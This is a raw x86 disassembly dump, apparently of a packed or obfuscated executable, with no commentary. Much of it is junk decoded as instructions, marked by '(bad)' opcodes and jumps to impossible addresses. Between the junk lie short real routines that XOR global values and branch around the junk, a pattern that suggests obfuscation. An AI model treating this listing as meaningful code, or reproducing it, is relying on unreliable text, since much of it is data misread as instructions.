  40ce1b:	mov    ch,0x63
  40ce1d:	push   ds
  40ce1e:	out    0xd9,eax
  40ce20:	(bad)
  40ce24:	out    0x24,al
  40ce26:	imul   eax,DWORD PTR [ecx+0x71],0xffffff8b
  40ce2a:	sar    DWORD PTR [ebp+0x31],1
  40ce2d:	rol    bl,1
  40ce2f:	mov    eax,ds:0xdb384177
  40ce34:	aas    
  40ce35:	idiv   DWORD PTR [esi]
  40ce37:	das    
  40ce38:	rol    DWORD PTR [ebp+0x7fec386b],1
  40ce3e:	test   BYTE PTR [edi],cl
  40ce40:	add    DWORD PTR [ebx],0xffffffe1
  40ce43:	dec    ebx
  40ce44:	pop    eax
  40ce45:	sti    
  40ce46:	shr    DWORD PTR [edi+0x20143621],1
  40ce4c:	clc    
  40ce4d:	jg     0x40cecb
  40ce4f:	sub    eax,0x4ee1ad17
  40ce54:	sbb    BYTE PTR [ecx],0x6e
  40ce57:	(bad)  
  40ce58:	sbb    eax,0x2f2ebae0
  40ce5d:	jge    0x40ceba
  40ce5f:	xor    dh,dl
  40ce61:	lods   al,BYTE PTR ds:[esi]
  40ce62:	and    al,0x8b
  40ce64:	sbb    edi,DWORD PTR [ebx+0x63]
  40ce67:	or     BYTE PTR [edi+0x7c],dl
  40ce6a:	sbb    eax,0x522f4114
  40ce6f:	stos   BYTE PTR es:[edi],al
  40ce70:	push   esp
  40ce71:	inc    ebx
  40ce72:	pop    ebx
  40ce73:	jae    0x40cee9
  40ce75:	(bad)  [ecx]
  40ce77:	xor    BYTE PTR [edx-0x766f380a],0xd5
  40ce7e:	adc    eax,DWORD PTR ds:0xb3eed4a8
  40ce84:	shr    WORD PTR [ebx+ecx*2],0x4a
  40ce89:	mov    ebx,0xb88c5aca
  40ce8e:	xor    ebx,DWORD PTR [ecx-0x16]
  40ce91:	sbb    edi,DWORD PTR [ecx-0x6a224ab7]
  40ce97:	sti    
  40ce98:	dec    ecx
  40ce99:	mov    esp,0xa3dd000b
  40ce9e:	popa   
  40ce9f:	push   0xe40c2bae
  40cea4:	clc    
  40cea5:	mov    bh,0x50
  40cea7:	pop    ss
  40cea8:	fcom   QWORD PTR [eax+0xc8f6590]
  40ceae:	in     al,0x33
  40ceb0:	loop   0x40ce3f
  40ceb2:	push   cs
  40ceb3:	mov    cl,0x28
  40ceb5:	pop    esp
  40ceb6:	(bad)  [edi]
  40ceb8:	int    0xbc
  40ceba:	add    BYTE PTR [ebx-0x2e],ch
  40cebd:	sbb    BYTE PTR [eax+0x15],0x87
  40cec1:	stc    
  40cec2:	sti    
  40cec3:	jns    0x40cef8
  40cec5:	and    DWORD PTR [esi+0x118bf95a],ebp
  40cecb:	pop    esi
  40cecc:	add    BYTE PTR [eax-0x1be80213],ah
  40ced2:	out    dx,al
  40ced3:	sahf   
  40ced4:	cmp    BYTE PTR [esi+ecx*8],cl
  40ced7:	leave  
  40ced8:	mov    eax,ds:0x5234ca62
  40cedd:	mov    edx,0x1cc026e
  40cee2:	ret    0x36bd
  40cee5:	push   es
  40cee6:	jnp    0x40ce76
  40cee8:	out    dx,eax
  40cee9:	sub    BYTE PTR [ebx],al
  40ceeb:	and    ebx,DWORD PTR [ecx+0x55]
  40ceee:	das    
  40ceef:	(bad)  
  40cef0:	(bad)  
  40cef1:	gs pusha 
  40cef3:	cmp    dl,0xd5
  40cef6:	inc    esi
  40cef7:	mov    ebx,0xdd9d6aa2
  40cefc:	adc    dh,dl
  40cefe:	xchg   ebx,eax
  40ceff:	fdiv   DWORD PTR [edi-0x63]
  40cf02:	cmp    dl,ch
  40cf04:	clc    
  40cf05:	cmp    bh,bl
  40cf07:	pop    es
  40cf08:	jo     0x40ce9a
  40cf0a:	adc    eax,0xb9909d7f
  40cf0f:	push   edi
  40cf10:	pop    ebx
  40cf11:	and    eax,0x8c185d83
  40cf16:	loop   0x40cf19
  40cf18:	jle    0x40cf5f
  40cf1a:	lods   eax,DWORD PTR ds:[esi]
  40cf1b:	dec    esi
  40cf1c:	test   ah,dh
  40cf1e:	adc    ecx,ebp
  40cf20:	jo     0x40cec6
  40cf22:	xchg   esp,eax
  40cf23:	test   al,0xae
  40cf25:	fdiv   st(2),st
  40cf27:	sub    eax,0xa17df115
  40cf2c:	pop    esp
  40cf2d:	mov    al,0x2b
  40cf2f:	into   
  40cf30:	ret    
  40cf31:	or     al,0x5b
  40cf33:	int    0x60
  40cf35:	repz mov esi,0xcb2a471d
  40cf3b:	pop    ss
  40cf3c:	ds scas eax,DWORD PTR es:[edi]
  40cf3e:	(bad)  
  40cf3f:	jl     0x40cf5d
  40cf41:	fs jp  0x40cf6f
  40cf44:	xor    bl,BYTE PTR [edi+0x3e]
  40cf47:	fs iret 
  40cf49:	cs stos DWORD PTR es:[edi],eax
  40cf4b:	jmp    DWORD PTR [esi+0x7228d7b9]
  40cf51:	push   ebp
  40cf52:	and    bl,BYTE PTR [edi+0x2c]
  40cf55:	es mov edx,0x52a13841
  40cf5b:	sbb    DWORD PTR [edx+0x1cba87bb],esi
  40cf61:	adc    al,0xe1
  40cf63:	jp     0x40cf51
  40cf65:	sub    esp,edx
  40cf67:	retf   
  40cf68:	cmp    ebp,DWORD PTR [edi]
  40cf6a:	jo     0x40cf06
  40cf6c:	pop    eax
  40cf6d:	ja     0x40cfc5
  40cf6f:	mov    bl,0xeb
  40cf71:	(bad)  
  40cf72:	fld    DWORD PTR [eax]
  40cf74:	mov    ah,0xb6
  40cf76:	inc    ebp
  40cf77:	mov    eax,0x213e5d83
  40cf7c:	adc    al,0x2c
  40cf7e:	sub    bl,ch
  40cf80:	pusha  
  40cf81:	mov    ebp,0x274c7602
  40cf86:	jp     0x40cfa0
  40cf88:	pop    esi
  40cf89:	in     al,dx
  40cf8a:	fcom   QWORD PTR [esi]
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a865,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a899,0x42a77d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	mov    eax,0x2aae7afc
  40cfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfd0:	js     0x40d04a
  40cfd2:	xor    eax,0xfb78787e
  40cfd7:	pop    es
  40cfd8:	imul   DWORD PTR [eax+0x6f6f181a]
  40cfde:	neg    DWORD PTR [eax+edi*8]
  40cfe1:	jge    0x40cfa9
  40cfe3:	mov    edx,0xe13ab92b
  40cfe8:	pop    esp
  40cfe9:	mov    al,ds:0xbc153efd
  40cfee:	repnz ins DWORD PTR es:[edi],dx
  40cff0:	dec    ebp
  40cff1:	stos   DWORD PTR es:[edi],eax
  40cff2:	push   ecx
  40cff3:	xor    ebp,DWORD PTR [ebp-0x1dd76e20]
  40cff9:	retf   
  40cffa:	xor    edx,DWORD PTR [ecx]
  40cffc:	xchg   ebx,eax
  40cffd:	sbb    dh,BYTE PTR [ecx-0x77256fef]
  40d003:	test   BYTE PTR [eax],ah
  40d005:	inc    ebp
  40d006:	push   eax
  40d007:	ins    BYTE PTR es:[edi],dx
  40d008:	cld    
  40d009:	jmp    0x7397:0x29af49f3
  40d010:	xor    al,0x76
  40d012:	add    al,0xbe
  40d014:	and    esi,ebp
  40d016:	repnz add al,0x44
  40d019:	int3   
  40d01a:	sub    DWORD PTR ds:0x857237ee,esp
  40d020:	lahf   
  40d021:	xor    al,0xf7
  40d023:	or     BYTE PTR [edx],al
  40d025:	dec    ebx
  40d026:	sbb    al,0x91
  40d028:	(bad)  
  40d029:	pop    eax
  40d02a:	xchg   esp,eax
  40d02b:	ja     0x40d028
  40d02d:	in     al,0x71
  40d02f:	rcr    DWORD PTR [edx],0xb5
  40d032:	mov    esi,0x8897a6fb
  40d037:	repnz xor al,0xba
  40d03a:	adc    BYTE PTR [edi],dh
  40d03c:	mov    ebp,0xd6dae854
  40d041:	mov    ds:0xfa721834,al
  40d046:	mov    ?,WORD PTR [esi+0x65]
  40d049:	test   eax,0xf8d587d6
  40d04e:	ds mov esp,0x7047ade1
  40d054:	xchg   ecx,esi
  40d056:	xor    bh,BYTE PTR [ebx+0x24]
  40d059:	lea    edi,[edx-0x4682d243]
  40d05f:	mov    dl,BYTE PTR [edi+0x22]
  40d062:	rcr    BYTE PTR [esi-0x6],0xda
  40d066:	jg     0x40cffd
  40d068:	xchg   edi,eax
  40d069:	sub    ah,BYTE PTR [eax-0x1f]
  40d06c:	adc    esi,edx
  40d06e:	fwait
  40d06f:	or     eax,0x391a7793
  40d074:	push   es
  40d075:	lods   eax,DWORD PTR ds:[si]
  40d077:	dec    ecx
  40d078:	dec    esi
  40d079:	sbb    al,0x92
  40d07b:	mov    dl,BYTE PTR [ebx+esi*1]
  40d07e:	inc    ecx
  40d07f:	cmp    al,0xf3
  40d081:	mov    edi,0x8b886ddc
  40d086:	ror    DWORD PTR [ebp+0x41],1
  40d089:	sbb    eax,eax
  40d08b:	sahf   
  40d08c:	aad    0x7e
  40d08e:	push   esp
  40d08f:	dec    edi
  40d090:	pop    es
  40d091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d093:	push   0xffffffac
  40d095:	and    al,0xa5
  40d097:	push   0xa69d7ff2
  40d09c:	mov    WORD PTR [esi],cs
  40d09e:	mov    ah,BYTE PTR ds:[edi-0x31]
  40d0a2:	ins    DWORD PTR es:[edi],dx
  40d0a3:	sbb    eax,0x5643272
  40d0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0a9:	enter  0x8e6c,0xa7
  40d0ad:	shl    BYTE PTR [ebx],0x7d
  40d0b0:	(bad)  
  40d0b1:	jmp    DWORD PTR [ebx+edx*4]
  40d0b4:	pushf  
  40d0b5:	arpl   WORD PTR [edx],di
  40d0b7:	pcmpgtd mm0,mm5
  40d0ba:	xchg   esp,eax
  40d0bb:	nop
  40d0bc:	(bad)  
  40d0be:	jo     0x40d0c9
  40d0c0:	cmp    eax,0xc1a07903
  40d0c5:	fwait
  40d0c6:	out    dx,eax
  40d0c7:	push   0x15
  40d0c9:	xchg   ebx,eax
  40d0ca:	inc    eax
  40d0cb:	daa    
  40d0cc:	and    DWORD PTR [esi],esi
  40d0ce:	xlat   BYTE PTR ds:[ebx]
  40d0cf:	daa    
  40d0d0:	sub    edx,ecx
  40d0d2:	mov    DWORD PTR [eax],esi
  40d0d4:	sbb    DWORD PTR [edx-0x3f],edi
  40d0d7:	js     0x40d10f
  40d0d9:	es add eax,0x508271ef
  40d0df:	push   esp
  40d0e0:	retf   
  40d0e1:	pop    edx
  40d0e2:	push   edi
  40d0e3:	(bad)
  40d0e6:	lock test eax,0xb2d3a21b
  40d0ec:	int    0x39
  40d0ee:	pop    esp
  40d0ef:	mov    DWORD PTR [esi+0x4a],ebp
  40d0f2:	out    dx,eax
  40d0f3:	push   ecx
  40d0f4:	sub    eax,0xeda4fdaf
  40d0f9:	inc    DWORD PTR [ebp-0x1f6efea6]
  40d0ff:	push   0x40bebf5f
  40d104:	mov    bh,0x9b
  40d106:	jb     0x40d13d
  40d108:	pop    ebx
  40d109:	push   eax
  40d10a:	sub    BYTE PTR [edx+0x56],ah
  40d10d:	call   0x8bca:0x212915c
  40d114:	sbb    al,0x33
  40d116:	arpl   bx,bx
  40d118:	fldcw  WORD PTR ds:0x38a94f5f
  40d11e:	retf   
  40d11f:	repnz pop ebx
  40d121:	xchg   ebp,eax
  40d122:	mov    fs,WORD PTR [edi+0x3b6abe92]
  40d128:	call   0xf26d686b
  40d12d:	push   es
  40d12e:	mov    dh,0xfb
  40d130:	xor    DWORD PTR [ebx-0x35d69940],ebx
  40d136:	push   edi
  40d137:	ins    DWORD PTR es:[edi],dx
  40d138:	dec    esp
  40d139:	mov    DWORD PTR [ecx+0x2684214a],edx
  40d13f:	pop    ebx
  40d140:	scas   al,BYTE PTR es:[edi]
  40d141:	sub    DWORD PTR [edx+ecx*2],ebp
  40d144:	outs   dx,BYTE PTR ds:[esi]
  40d145:	sbb    DWORD PTR [ebx],ebx
  40d147:	icebp  
  40d148:	(bad)  
  40d149:	mov    DWORD PTR [esi+0x39],ecx
  40d14c:	adc    eax,0xe01a8b3
  40d151:	outs   dx,DWORD PTR ds:[esi]
  40d152:	js     0x40d0d8
  40d154:	pop    ecx
  40d155:	inc    esi
  40d156:	(bad)  
  40d157:	out    dx,eax
  40d158:	pop    esi
  40d159:	jnp    0x40d16e
  40d15b:	arpl   WORD PTR [edi-0x23],bx
  40d15e:	mov    edi,0xe697cb2e
  40d163:	push   ebp
  40d164:	call   0x9fba3c8f
  40d169:	mov    eax,ds:0x40bf90b4
  40d16e:	xor    DWORD PTR [edi],esp
  40d170:	lea    ebp,[ebp+0x2f]
  40d173:	adc    eax,0x5a923431
  40d178:	sub    eax,ebx
  40d17a:	repz inc edx
  40d17c:	pop    ebp
  40d17d:	test   BYTE PTR [eax+edi*1+0x60],0xa9
  40d182:	xchg   edx,eax
  40d183:	js     0x40d162
  40d185:	dec    edx
  40d186:	in     al,dx
  40d187:	repnz stos BYTE PTR es:[edi],al
  40d189:	xor    ch,ah
  40d18b:	inc    esi
  40d18c:	push   ebx
  40d18d:	cdq    
  40d18e:	add    edi,DWORD PTR [edi]
  40d190:	fcomi  st,st(3)
  40d192:	pop    esi
  40d193:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d195:	dec    ebp
  40d196:	mov    esi,ecx
  40d198:	or     DWORD PTR [edx-0x7a],ecx
  40d19b:	mov    WORD PTR [ebx+0x61a3a262],?
  40d1a1:	pop    ecx
  40d1a2:	sbb    DWORD PTR [ecx-0x73e680b0],esp
  40d1a8:	add    dh,ah
  40d1aa:	adc    al,0xc
  40d1ac:	ror    BYTE PTR [ebp+0x178851ca],cl
  40d1b2:	cmp    dl,BYTE PTR [edi-0x3be8d25b]
  40d1b8:	aaa    
  40d1b9:	jns    0x40d1e0
  40d1bb:	lock and BYTE PTR [edi+0x5200902c],al
  40d1c2:	dec    BYTE PTR [eax]
  40d1c4:	xchg   edi,eax
  40d1c5:	push   ebp
  40d1c6:	pushf  
  40d1c7:	push   edi
  40d1c8:	mov    edx,0x418c1511
  40d1cd:	push   ds
  40d1ce:	and    al,0x4a
  40d1d0:	rol    BYTE PTR [edx],1
  40d1d2:	shr    DWORD PTR [eax+edx*4+0x7aacbbad],cl
  40d1d9:	push   0xa3ac1512
  40d1de:	jno    0x40d1de
  40d1e0:	ins    BYTE PTR es:[edi],dx
  40d1e1:	cmp    bh,BYTE PTR ds:0xd8db2c75
  40d1e7:	lahf   
  40d1e8:	jl     0x40d20a
  40d1ea:	mov    cl,0x1
  40d1ec:	sbb    ch,cl
  40d1ee:	dec    ecx
  40d1ef:	test   BYTE PTR [ebp+ebp*4-0x46],al
  40d1f3:	and    al,0xe0
  40d1f5:	cmp    ah,BYTE PTR [ecx+0x52e50797]
  40d1fb:	lds    ecx,FWORD PTR [ebx+0x5afeca7b]
  40d201:	dec    eax
  40d202:	(bad)  
  40d203:	jmp    0xd9b0:0x45b3b29c
  40d20a:	ret    
  40d20b:	std    
  40d20c:	sbb    eax,0x2ecb8c9b
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7d5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7d5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7d5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7d5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7d5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a795
  40d260:	xor    ebx,DWORD PTR ds:0x42a77d
  40d266:	mov    DWORD PTR ds:0x42a795,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7dd,0x42a899
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a8a9,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a899,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a865
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	cmp    edx,DWORD PTR [edx-0x5a18ab21]
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x2078787e
  40d2c6:	mov    ecx,0xa34ea86d
  40d2cb:	outs   dx,DWORD PTR ds:[esi]
  40d2cc:	mov    ds:0x15016987,eax
  40d2d1:	xor    eax,0x9268c52a
  40d2d6:	mov    ebx,0xbcc3d6b
  40d2db:	mov    bh,0xce
  40d2dd:	repz pusha 
  40d2df:	xchg   edi,eax
  40d2e0:	enter  0x9dc6,0x3d
  40d2e4:	dec    ebx
  40d2e5:	imul   edx,DWORD PTR [edi+0x9],0xabeb20d4
  40d2ec:	outs   dx,DWORD PTR ds:[esi]
  40d2ed:	retf   0xf722
  40d2f0:	mov    dl,0x9c
  40d2f2:	lahf   
  40d2f3:	push   esp
  40d2f4:	popa   
  40d2f5:	in     eax,0x8a
  40d2f7:	ret    
  40d2f8:	sti    
  40d2f9:	mov    al,0xa2
  40d2fb:	aaa    
  40d2fc:	mov    ebp,0x70a6fe21
  40d301:	outs   dx,BYTE PTR ds:[esi]
  40d302:	pusha  
  40d303:	mov    DWORD PTR [ebp-0x548a948d],esp
  40d309:	dec    esp
  40d30a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d30b:	sub    edx,esi
  40d30d:	cld    
  40d30e:	shl    BYTE PTR [ebp+0x55],0x32
  40d312:	xchg   edx,eax
  40d313:	bound  ecx,QWORD PTR [ebx+ecx*2]
  40d316:	jge    0x40d32e
  40d318:	jecxz  0x40d398
  40d31a:	adc    eax,0xc5c6e4be
  40d31f:	cmp    BYTE PTR cs:[ebp+0x4fc9a1f3],cl
  40d326:	ins    BYTE PTR es:[edi],dx
  40d327:	jecxz  0x40d36b
  40d329:	retf   
  40d32a:	pushf  
  40d32b:	or     al,0xe5
  40d32d:	dec    esp
  40d32e:	ja     0x40d391
  40d330:	push   eax
  40d331:	jecxz  0x40d320
  40d333:	call   0x461382
  40d338:	jge    0x40d363
  40d33a:	dec    ebx
  40d33b:	xor    eax,0xd735c638
  40d340:	sbb    bh,cl
  40d342:	(bad)  
  40d343:	mov    eax,0x678b0d2a
  40d348:	out    0x16,al
  40d34a:	mov    ch,0xb9
  40d34c:	and    edx,DWORD PTR [eax]
  40d34e:	fdivr  st(2),st
  40d350:	xchg   edi,eax
  40d351:	mov    ebx,0x84fea4da
  40d356:	inc    edx
  40d357:	mov    BYTE PTR [ecx-0x44],ch
  40d35a:	ror    DWORD PTR [eax+ebx*2+0x2a787bdb],cl
  40d361:	std    
  40d362:	sub    al,cl
  40d364:	xor    al,0x1f
  40d366:	xlat   BYTE PTR ds:[ebx]
  40d367:	xlat   BYTE PTR ds:[ebx]
  40d368:	data16 cmp al,0x23
  40d36b:	pop    ecx
  40d36c:	adc    ebx,DWORD PTR [ecx-0x6f204776]
  40d372:	xor    BYTE PTR [edi],cl
  40d374:	icebp  
  40d375:	push   0x1f
  40d377:	inc    ecx
  40d378:	xchg   ebx,eax
  40d379:	repz add DWORD PTR ds:0x4ffb05bb,edx
  40d380:	push   edx
  40d381:	mov    edi,0x3774426f
  40d386:	int    0xc1
  40d388:	loopne 0x40d3cf
  40d38a:	retf   
  40d38b:	inc    esp
  40d38c:	sbb    bh,BYTE PTR [edx]
  40d38e:	into   
  40d38f:	ja     0x40d386
  40d391:	jp     0x40d3eb
  40d393:	fst    QWORD PTR [ebp+0x5a]
  40d396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d397:	push   ecx
  40d398:	push   0xffffffde
  40d39a:	pop    ecx
  40d39b:	lock add ebp,ecx
  40d39e:	call   0x18b18bac
  40d3a3:	push   ebp
  40d3a4:	ret    
  40d3a5:	(bad)  
  40d3a6:	push   edi
  40d3a7:	aaa    
  40d3a8:	fsubr  st,st(3)
  40d3aa:	out    0x38,eax
  40d3ac:	retf   
  40d3ad:	or     bh,BYTE PTR [ebx+0x6b]
  40d3b0:	inc    ecx
  40d3b1:	mov    ?,ebp
  40d3b3:	and    bl,ah
  40d3b5:	xor    dh,BYTE PTR [ebx+0x38]
  40d3b8:	pop    ds
  40d3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ba:	fcomp  QWORD PTR [esi+0x10661567]
  40d3c0:	jle    0x40d3e1
  40d3c2:	cmp    cl,BYTE PTR [edx-0x5fec8014]
  40d3c8:	xor    ecx,DWORD PTR [edx]
  40d3ca:	aas    
  40d3cb:	jo     0x40d40d
  40d3cd:	jne    0x40d389
  40d3cf:	add    DWORD PTR [ecx],edx
  40d3d1:	mov    dh,0x79
  40d3d3:	aad    0xd7
  40d3d5:	outs   dx,DWORD PTR ds:[esi]
  40d3d6:	cmp    ch,al
  40d3d8:	outs   dx,BYTE PTR ds:[esi]
  40d3d9:	inc    ebp
  40d3da:	cld    
  40d3db:	(bad)  
  40d3dc:	rcr    BYTE PTR [eax+ebx*2],1
  40d3df:	push   esp
  40d3e0:	push   es
  40d3e1:	xor    BYTE PTR [ebp+0x6b],0xe1
  40d3e5:	inc    esp
  40d3e6:	fidivr WORD PTR [ecx]
  40d3e8:	dec    edi
  40d3e9:	outs   dx,DWORD PTR ds:[esi]
  40d3ea:	test   ecx,0x88804274
  40d3f0:	xchg   esi,eax
  40d3f1:	inc    eax
  40d3f2:	fwait
  40d3f3:	cmc    
  40d3f4:	xor    ch,BYTE PTR [esi]
  40d3f6:	cmp    ebp,ecx
  40d3f8:	cmp    edx,ebx
  40d3fa:	push   edi
  40d3fb:	int    0x95
  40d3fd:	jle    0x40d45f
  40d3ff:	rcr    ecx,1
  40d401:	sub    al,0x9d
  40d403:	icebp  
  40d404:	sub    DWORD PTR [esi+esi*8+0x53a05bfe],ebp
  40d40b:	inc    esp
  40d40c:	lahf   
  40d40d:	sub    DWORD PTR [eax],0x380308b3
  40d413:	push   ss
  40d414:	adc    al,0xfb
  40d416:	jecxz  0x40d3c4
  40d418:	inc    ebx
  40d419:	mov    ebp,0x24aa13cf
  40d41e:	ror    DWORD PTR [ebx+0x2327267a],0x1f
  40d425:	mov    al,ds:0xfa32aee
  40d42a:	push   ds
  40d42b:	and    BYTE PTR [ecx],0x37
  40d42e:	push   esp
  40d42f:	arpl   WORD PTR [ebp+0x7d],bx
  40d432:	xchg   esp,eax
  40d433:	cmp    al,0xa4
  40d435:	shl    BYTE PTR [edi],1
  40d437:	stos   BYTE PTR es:[edi],al
  40d438:	(bad)  
  40d43a:	(bad)  
  40d43b:	fucomp st(0)
  40d43d:	add    ebx,DWORD PTR [edx]
  40d43f:	xor    BYTE PTR [edx-0x5b660978],0xae
  40d446:	(bad)  
  40d447:	mov    WORD PTR [eax+0x5cb1d17f],?
  40d44d:	(bad)  
  40d44e:	mov    edi,0x4c90c9f0
  40d453:	es push eax
  40d455:	daa    
  40d456:	mov    eax,0x4d95c236
  40d45b:	xor    bh,ah
  40d45d:	stos   BYTE PTR es:[edi],al
  40d45e:	mov    ds:0x97ea06e,eax
  40d463:	push   edi
  40d464:	jl     0x40d4b4
  40d466:	mov    fs,WORD PTR [eax-0x2d64f00]
  40d46c:	sbb    DWORD PTR [esi],edi
  40d46e:	cmp    al,0x38
  40d470:	rcr    BYTE PTR [ebx+edi*1+0x5a],cl
  40d474:	shl    cl,cl
  40d476:	lods   eax,DWORD PTR ds:[esi]
  40d477:	dec    edi
  40d478:	jmp    0x65730bec
  40d47d:	icebp  
  40d47e:	or     ebx,DWORD PTR [edi+0x66]
  40d481:	sub    BYTE PTR [ecx+0x17],dh
  40d484:	mov    ah,0x64
  40d486:	adc    eax,0x8ff02269
  40d48b:	out    0x56,eax
  40d48d:	into   
  40d48e:	cmp    ecx,esp
  40d490:	inc    BYTE PTR [eax+ebp*1+0x79e432c0]
  40d497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d498:	jo     0x40d4c7
  40d49a:	add    ecx,DWORD PTR ds:0x4ec6fa10
  40d4a0:	leave  
  40d4a1:	lea    ecx,[eax+0x27f5eabe]
  40d4a7:	push   eax
  40d4a8:	dec    esp
  40d4a9:	mov    edi,0x70e69a31
  40d4ae:	in     eax,dx
  40d4af:	mov    BYTE PTR [ebp-0x80],bl
  40d4b2:	cmp    esi,DWORD PTR [ebx]
  40d4b4:	sub    DWORD PTR [esi],ecx
  40d4b6:	je     0x40d447
  40d4b8:	push   0xe2d1556
  40d4bd:	mov    eax,0x51fdd82d
  40d4c2:	loope  0x40d496
  40d4c4:	in     eax,0xb3
  40d4c6:	xchg   BYTE PTR [eax],bh
  40d4c8:	retf   0x457b
  40d4cb:	lods   eax,DWORD PTR ds:[esi]
  40d4cc:	out    0xb4,eax
  40d4ce:	push   0x7a
  40d4d0:	push   0x64c3b595
  40d4d5:	inc    ebp
  40d4d6:	cmc    
  40d4d7:	in     eax,dx
  40d4d8:	dec    ebp
  40d4d9:	(bad)  
  40d4da:	jb     0x40d4cd
  40d4dc:	bound  ebx,QWORD PTR [eax]
  40d4de:	pusha  
  40d4df:	adc    dh,dh
  40d4e1:	xchg   edx,eax
  40d4e2:	xchg   ebx,eax
  40d4e3:	aaa    
  40d4e4:	pushf  
  40d4e5:	loope  0x40d4a0
  40d4e7:	xor    BYTE PTR [ebx+0x6e],ch
  40d4ea:	gs imul esp,esp,0x10
  40d4ee:	push   esi
  40d4ef:	pop    edi
  40d4f0:	mov    edi,0xa2f74b1d
  40d4f5:	inc    eax
  40d4f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f7:	out    dx,eax
  40d4f8:	mul    ch
  40d4fa:	ret    0x5eb0
  40d4fd:	pop    ss
  40d4fe:	ja     0x40d506
  40d500:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  40d507:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  40d50e:	and    DWORD PTR ds:0x42a815,0x42a825
  40d518:	add    edi,ebx
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a789,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7ed,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a855,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	shl    DWORD PTR [ecx-0x54634a40],1
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0xf878787e
  40d582:	in     al,0xa0
  40d584:	fdiv   QWORD PTR [ecx+0x48]
  40d587:	stos   DWORD PTR es:[edi],eax
  40d588:	cs mov dl,0x54
  40d58b:	sbb    ch,BYTE PTR [eax+edx*4]
  40d58e:	or     eax,0x40b5971f
  40d594:	jno    0x40d536
  40d596:	adc    eax,0xe19b0b96
  40d59b:	mov    dl,0x20
  40d59d:	(bad)  
  40d59e:	sbb    cl,BYTE PTR [ecx+0x63]
  40d5a1:	mov    dh,0x4
  40d5a3:	pop    ecx
  40d5a4:	pop    es
  40d5a5:	and    cl,al
  40d5a7:	jo     0x60c2afae
  40d5ad:	add    al,0xb8
  40d5af:	push   edx
  40d5b0:	add    dh,BYTE PTR ss:[eax-0x192cff7c]
  40d5b7:	xchg   esp,eax
  40d5b8:	and    al,0x21
  40d5ba:	retf   
  40d5bb:	pop    ecx
  40d5bc:	xor    BYTE PTR ds:0xa85cb117,bh
  40d5c2:	clc    
  40d5c3:	je     0x40d5d6
  40d5c5:	sbb    DWORD PTR [edx+0xe140ad9],ecx
  40d5cb:	sbb    eax,0xdc6e5cd0
  40d5d0:	jmp    0x40d624
  40d5d2:	retf   
  40d5d3:	inc    esi
  40d5d4:	jl     0x40d620
  40d5d6:	iret   
  40d5d7:	inc    ebx
  40d5d8:	jne    0x40d580
  40d5da:	lock ret 
  40d5dc:	xor    dl,al
  40d5de:	dec    esi
  40d5df:	fist   DWORD PTR [ebx]
  40d5e1:	push   ds
  40d5e2:	test   BYTE PTR ds:0x1fdfbf02,ch
  40d5e8:	aas    
  40d5e9:	pop    eax
  40d5ea:	pop    esi
  40d5eb:	aam    0xda
  40d5ed:	gs or  eax,0xea09af93
